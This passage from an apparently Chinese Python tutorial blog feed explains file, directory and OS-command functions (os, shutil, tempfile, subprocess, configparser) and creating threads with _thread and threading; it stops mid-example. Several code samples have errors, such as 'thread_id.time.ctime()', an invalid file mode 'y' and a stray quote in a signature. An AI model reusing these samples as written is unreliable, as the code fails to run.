        <content type="html"><![CDATA[<h1 id="一、相关模块"><a href="#一、相关模块" class="headerlink" title="一、相关模块"></a>一、相关模块</h1><ul><li>os模块：与操作系统相关的函数</li><li>os.path模块：与路径相关的函数</li><li>glob模块：文件通配符操作</li><li>tempfile模块：创建临时目录和文件</li><li>shutil模块：与目录和文件操作相关的函数</li><li>subprocess模块：用于执行其他程序</li></ul><h1 id="二、目录、文件和磁盘的基本操作"><a href="#二、目录、文件和磁盘的基本操作" class="headerlink" title="二、目录、文件和磁盘的基本操作"></a>二、目录、文件和磁盘的基本操作</h1><p><strong>创建目录</strong></p><p>使用os模块中的mkdir函数，可以创建目录，语法形式如下：</p><ul><li>os.mkdir(path,mode=0o777)    #创建目录path</li><li>os.makedirs(path,mode=0o777)    #创建目录path，以及所有的path中包含的上级目录</li></ul><p>其中，path为指定目录。如果path已存在，则导致FileExistsError</p><p><strong>临时目录和文件的创建</strong></p><p>使用tempfile模块中的函数，可以创建临时目录和文件，语法形式如下：</p><ul><li>tempfile.mkdtemp(suffix=’’,prefix=’tmp’,dir=None)    #创建并返回临时目录</li><li>tempfile.mkstemp(suffix=’’,prefix=’tmp’,dir=None,text=False)    #创建并返回临时文件</li><li>tempfile.TemporaryDirectory(suffix=’’,prefix=’tmp’,dir=None)    #调用mkdtemp，创建临时目录</li><li>tempfile.TemporaryFile(mode=’w+b’,buffering=None,encoding=None,newline=None,suffix=’’,prefix=’tmp’,dir=None)    #调用mkstemp，创建临时文件</li><li>tempfile.tempdir    #设置临时目录对应的路径</li><li>tempfile.gettempdir()    #获取临时目录</li></ul><p><strong>切换当前工作目录</strong></p><p>使用os模块中的chdir函数，可以切换当前工作目录，语法形式如下：</p><p>os.chdir(path)    #切换当前工作目录为path</p><p>其中，path为指定文件。如果找不到path，则导致FileNotFoundError</p><p><strong>目录内容列表</strong></p><p>使用os模块中的listdir函数，可以显示一个目录中的文件/子目录列表，语法形式如下：</p><p>os.listdir(path=’.’)    # 返回指定目录path中的所有文件/子目录的列表</p><p>其中，path为指定目录，默认为当前目录：’.’。os.curdir也表示当前目录</p><p><strong>文件通配符和glob.glob函数</strong></p><p>使用glob模块中的glob函数，可以获取满足指定模式的文件/目录列表，语法形式如下：</p><p>glob.glob(pathname)    #返回满足指定模式pathname的文件/目录的列表</p><p>其中，pathname为目录/文件模式，可以包含通配符*（0或多个字符）和？（1个字符）</p><p><strong>遍历目录和os.walk函数</strong></p><p>使用os模块的walk函数，可以遍历指定的目录结构，语法形式如下：</p><p>os.walk(top,topdown=True,onerror=None,followlink=False)    #返回目录结构的迭代器</p><p>其中，top为起始目录；topdown若为False，则从下往上遍历。对于目录结构中的每一个目录，生成一个元组：（dirpath,dirnames,filenames），dirpath为目录，dirnames为其中包含的子目录列表，filenames为其中包含的文件列表。</p><p>使用os模块的join函数，可以将目录名和文件名连接成全限定路径，函数形式如下：</p><p>os.path.join(path1[,path2[, …]])</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#输出指定目录的目录结构</span><span class="token keyword">import</span> re<span class="token punctuation">,</span>os<span class="token punctuation">,</span>os<span class="token punctuation">.</span>path<span class="token keyword">def</span> <span class="token function">ls_py</span><span class="token punctuation">(</span>top<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>dirname<span class="token punctuation">,</span>subdirs<span class="token punctuation">,</span>files<span class="token punctuation">)</span><span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>top<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token operator">+</span>dirname<span class="token operator">+</span><span class="token string">']'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> fname <span class="token keyword">in</span> files<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>dirname<span class="token punctuation">,</span>fname<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    path1<span class="token operator">=</span>r<span class="token string">'c:\pyrhonpa\ch17'</span>    ls_py<span class="token punctuation">(</span>path1<span class="token punctuation">)</span></code></pre><p><strong>判断文件/目录是否存在</strong></p><p>使用os.path模块函数exists，可以判断文件/目录是否存在，语法形式如下：</p><p>os.path.exists(路径名)</p><p><strong>测试文件类型</strong></p><ul><li>os.path.isfile(path)    #路径path是否为文件类型</li><li>os.path.isdir(path)    #路径path是否为目录类型</li><li>os.path.islink(path)    #路径path是否为链接类型</li><li>os.path.ismount(path)    #路径path是否为装载点类型</li><li>os.path.isabs(path)    #路径path是否为绝对路径</li></ul><p><strong>文件的日期及大小</strong></p><p>使用os.path模块函数，可以获取文件和目录的其它属性，语法形式如下：</p><ul><li>os.path.getatime(path)    #返回上次访问时间</li><li>os.path.getmtime(path)    #返回上次修改时间</li><li>os.path.getctime(path)    #返回创建时间</li><li>os.path.getsize(path)    #返回指定路径path的大小</li></ul><p>其中，path为指定文件目录路径，默认为当前目录: ‘.’</p><p><strong>文件的删除</strong></p><p>使用os模块中的remove函数，可以删除指定文件，语法形式如下：</p><p>os.remove(path)    #删除指定文件path</p><p><strong>目录的删除</strong></p><p>使用os模块中的rmdir函数，可以删除指定目录，语法形式如下：</p><p>os.rmdir(path)    #删除指定目录path</p><p>使用shutil模块中的rmtree函数，可以删除指定目录及目录下的所有内容</p><p>shutil.rmtree(path)    #删除指定目录path</p><p><strong>文件和目录复制、重命名和移动</strong></p><p>使用shutil模块中的下列函数，可以复制文件和目录，语法形式如下：</p><ul><li>shutil.copy(src,dst)    #拷贝文件src到dst，如果dst为目录，则拷贝到dst目录下</li><li>shutil.copy2(src,dst)    #拷贝文件src到dst，如果dst为目录，则拷贝到dst目录下</li><li>shutil.copytree(src,dst,symlinks=False,ignore=None)    #拷贝目录树src到dst</li><li>shutil.move(src,dst)    #将文件/目录src移动到dst</li></ul><p><strong>磁盘的基本操作</strong></p><p>使用shutil模块中的disk_usage函数，可以获取磁盘空间的使用情况，语法形式如下：</p><p>shutil.disk_usage(path)    #返回指定path上的磁盘的空间使用情况：（总数，已用，可用）</p><h1 id="三、执行操作系统命令和运行其他程序"><a href="#三、执行操作系统命令和运行其他程序" class="headerlink" title="三、执行操作系统命令和运行其他程序"></a>三、执行操作系统命令和运行其他程序</h1><p><strong>os.system函数</strong></p><p>使用os模块中的system函数，可以在Python程序中执行操作系统的命令和脚本，或运行其它程序，语法形式如下：</p><p>os.system(command)    #执行操作系统命令，返回命令执行结果的返回代码</p><pre class=" language-python"><code class="language-python">os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#执行操作系统命令</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'notepad.exe'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#执行程序，启动记事本</span></code></pre><p><strong>os.popen函数</strong></p><p>执行操作系统的命令和脚本</p><p>os.popen(…)    #执行操作系统命令，返回打开的管道（相当于文件）</p><p><strong>subprocess模块</strong></p><p>创建子进程、运行外部程序、连接到其输入/输出/错误管道、获取其返回值</p><p>取代os.system和os.popen函数，提供更高级的功能</p><ul><li>call(args,*,stdin=None,stdout=None,stderr=None,shell=False,timeout=None)</li><li>check_call(args,*,stdin=None,stdout=None,stderr=None,shell=False,timeout=None)</li><li>check_output(args,’,stdin=None,stderr=None,shell=False,universal_newlines=False,timeout=None)</li></ul><p><strong>获取终端的大小</strong></p><p>通过os或shutil模块的get_terminal_size函数，可以获取终端的大小，以方便输出内容的格式化操作</p><ul><li>os.get_terminal_size(fd=STDOUT_FILENO)    #获取并返回终端大小</li><li>shutil.get_terminal_size(fallback=(80,24))    #获取并返回终端大小</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#获取终端的大小示例</span><span class="token keyword">import</span> os<span class="token punctuation">,</span>shutil<span class="token keyword">def</span> <span class="token function">get_term_size_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sz<span class="token operator">=</span>shutil<span class="token punctuation">.</span>get_terminal_size<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'窗口大小：'</span><span class="token punctuation">,</span>sz<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>sz<span class="token punctuation">.</span>lines<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span> sz<span class="token punctuation">.</span>columns<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    get_term_size_test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong>文件压缩和解压缩</strong></p><p>使用shutil模块的make_archive和unpack_archive等函数，实现文件的压缩和解压缩功能</p><p>shutil模块支持的压缩和解压缩格式：shutil模块的get_archive_formats和get_unpack_formats函数返回支持的压缩和解压缩格式</p><h1 id="四、CONFIGPARSER模块和配置文件"><a href="#四、CONFIGPARSER模块和配置文件" class="headerlink" title="四、CONFIGPARSER模块和配置文件"></a>四、CONFIGPARSER模块和配置文件</h1><ul><li>configparser模块用于读取和写入配置文件</li><li>INI文件及INI文件格式<ul><li>通常位于应用程序的配置文件文件夹中，用于保存应用程序的各种配置信息</li></ul></li><li>ConfigParser对象和INI文件操作<ul><li>读取和写入INI文件……<br><img src="https://www.hualigs.cn/image/604c831cae4d9.jpg" alt=""></li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#读取和写入INI文件</span><span class="token keyword">import</span> configparser<span class="token keyword">def</span> <span class="token function">ini_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#创建INI文件</span>    config<span class="token operator">=</span>configparser<span class="token punctuation">.</span>ConfigParser<span class="token punctuation">(</span><span class="token punctuation">)</span>    config<span class="token punctuation">[</span><span class="token string">'SystemInfo'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'port'</span><span class="token punctuation">:</span><span class="token string">'8080'</span><span class="token punctuation">}</span>    config<span class="token punctuation">[</span><span class="token string">'GameInfo'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'level1'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'scores'</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'example.ini'</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token keyword">as</span> configfile<span class="token punctuation">:</span>        config<span class="token punctuation">.</span>write<span class="token punctuation">(</span>configfile<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ini_read_write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#读取和设置INI文件</span>    config<span class="token operator">=</span>configparser<span class="token punctuation">.</span>ConfigParser<span class="token punctuation">(</span><span class="token punctuation">)</span>    config<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'example.ini'</span><span class="token punctuation">)</span>    config<span class="token punctuation">[</span><span class="token string">'SystemInfo'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'port'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'8088'</span>    config<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token string">'GameInfo'</span><span class="token punctuation">,</span><span class="token string">'scores'</span><span class="token punctuation">,</span><span class="token string">'1000'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> config<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token string">'GameInfo'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'example.ini'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> configfile<span class="token punctuation">:</span>        config<span class="token punctuation">.</span>write<span class="token punctuation">(</span>configfile<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    ini_create<span class="token punctuation">(</span><span class="token punctuation">)</span>    ini_read_write<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>3/13/2021 6:47:58 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python多线程</title>
      <link href="2021/03/12/python-duo-xian-cheng/"/>
      <url>2021/03/12/python-duo-xian-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>进程是操作系统中正在执行的不同应用程序的一个实例</p><p>线程是进程中的一个实体，是被操作系统独立调度和分派处理时间的基本单位</p><p><strong>线程的优缺点：</strong></p><ul><li>并发处理，因而特别适合需要同时执行多个操作的场合</li><li>解决用户响应性能和多任务的问题</li><li>引入了资源共享和同步等问题</li></ul><p>python3创建多线程主要有两种方法：函数、类</p><p>python3内置模块threading.Thread，可以很方便的创建多线程，threading.Thread()一般接收2个参数：</p><ul><li>线程函数名：要放置线程让其后台执行的函数，由用户自定义</li><li>线程函数的参数：线程函数名所需的参数，以tuple形式传入，如果不需要参数，可以不制定。</li></ul><p>自定义的类，两个要求：</p><ul><li>必须继承threading.Thread这个父类</li><li>必须重写init()和run()方法。run()方法相当于第一种方法中的线程函数，可以写自己需要的业务逻辑代码，在start()后会自动调用</li></ul><pre class=" language-python"><code class="language-python">threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>group<span class="token operator">=</span>None<span class="token punctuation">,</span>target<span class="token operator">=</span>None<span class="token punctuation">,</span>name<span class="token operator">=</span>None<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>kwars<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><ul><li>group: 应该为None</li><li>target: 可以传入一个函数用于run()方法调用</li><li>name: 线程名默认使用“Thread.N”</li><li>args: 元组，表示传入target函数的参数</li><li>kwargs: 字典，传入target函数中关键字参数</li></ul><p><strong>属性：</strong></p><ul><li>name    #线程表示，没有任何语义</li><li>daemon    #布尔值，如果是守护线程为True，不是为False，主线程不是守护线程，默认False</li></ul><p><strong>类方法：</strong></p><ul><li>run()    #用以表示线程活动的方法</li><li>start()    #启动线程活动</li><li>join([time])    #等待至线程中止。阻塞调用线程直至线程的join()方法被调用中止、正常退出或者抛出未处理的异常，或者是可选的超时发生。在于线程运行完之前，该子线程的父线程将一直被阻塞。</li><li>isAlive():    返回线程是否活动的</li><li>getName():    返回线程名</li><li>setName():    设置线程名</li></ul><p>python的_thread模块提供了基本的线程和互斥锁支持，threading模块则提供了功能更全面的线程控制机制以及信号量机制。</p><h1 id="二、创建和启动多线程"><a href="#二、创建和启动多线程" class="headerlink" title="二、创建和启动多线程"></a>二、创建和启动多线程</h1><ul><li><strong>使用start_new_thread函数创建线程</strong></li></ul><p>thread.start_new_thread(function,’args’,[kwargs])    #创建一个新线程并返回其标识符</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#使用_thread模块的start_new_thread函数创建线程</span><span class="token keyword">import</span> _thread<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token keyword">def</span> <span class="token function">timer</span><span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>range<span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#随机睡眠0-interval秒</span>        thread_id<span class="token operator">=</span>_thread<span class="token punctuation">.</span>get_ident<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取当前线程标识符</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Thread:{0} Time{1}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>thread_id<span class="token punctuation">.</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#使用start_new_thread()函数创建2个线程</span>    _thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span>timer<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建线程</span>    _thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span>timer<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建线程</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li><strong>使用Thread对象创建线程</strong><br>​​​​​​​<br>Thread(target=None,name=None,args=(),kwargs={})    #构造函数</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token keyword">def</span> <span class="token function">timer</span><span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>range<span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#随机睡眠0-interval秒</span>        thread_id<span class="token operator">=</span>threading<span class="token punctuation">.</span>get_ident<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取当前线程标识符</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Thread:{0} Time:{1}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>thread_id<span class="token punctuation">,</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>timer<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    t2<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>timer<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604b8bae74073.jpg" alt=""></p><ul><li><strong>自定义派生于Thread的对象</strong></li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#通过声明Thread派生类，创建和启动新线程</span><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token keyword">class</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#继承threading.Thread</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>interval<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#构造函数</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用父类构造函数</span>        self<span class="token punctuation">.</span>interval<span class="token operator">=</span>interval    <span class="token comment" spellcheck="true">#对象属性</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>range<span class="token punctuation">(</span>self<span class="token punctuation">.</span>interval<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#随机睡眠0-interval秒</span>            thread_id<span class="token operator">=</span>threading<span class="token punctuation">.</span>get_ident<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取当前线程标识符</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Thread:{0} Time:{1}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>thread_id<span class="token punctuation">,</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    t1<span class="token operator">=</span>MyThread<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    t2<span class="token operator">=</span>MyThread<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li><strong>线程加入join()</strong></li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token keyword">class</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#继承threading.Thread</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#构造函数</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用父类构造函数</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#睡眠1秒</span>            t<span class="token operator">=</span>threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取当前线程</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0} at {1}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>t<span class="token punctuation">.</span>name<span class="token punctuation">,</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'线程t1结束'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t1<span class="token operator">=</span>MyThread<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建线程   </span>    t1<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'t1'</span>    <span class="token comment" spellcheck="true">#设置线程名称</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#启动线程</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主线程开始等待线程(t1)2s'</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主线程等待线程(t1)2s结束'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主线程开始等待线程结束'</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主线程结束'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li><strong>用户线程和daemon线程：</strong><br>​​​​​​​ <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time<span class="token keyword">class</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#继承threading.Thread</span>  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>interval<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#构造函数</span>      threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用父类构造函数</span>      self<span class="token punctuation">.</span>interval<span class="token operator">=</span>interval    <span class="token comment" spellcheck="true">#对象属性</span>  <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      t<span class="token operator">=</span>threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取当前线程</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'线程'</span><span class="token operator">+</span>t<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">'开始'</span><span class="token punctuation">)</span>      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>self<span class="token punctuation">.</span>interval<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#延迟self.interval秒</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'线程'</span><span class="token operator">+</span>t<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">'结束'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">MyThreadDaemon</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>interval<span class="token punctuation">)</span><span class="token punctuation">:</span>      threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>      self<span class="token punctuation">.</span>interval<span class="token operator">=</span>interval  <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      t<span class="token operator">=</span>threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'线程'</span><span class="token operator">+</span>t<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">'开始'</span><span class="token punctuation">)</span>      <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>          time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>self<span class="token punctuation">.</span>interval<span class="token punctuation">)</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'daemon线程'</span><span class="token operator">+</span>t<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">'正在运行'</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token 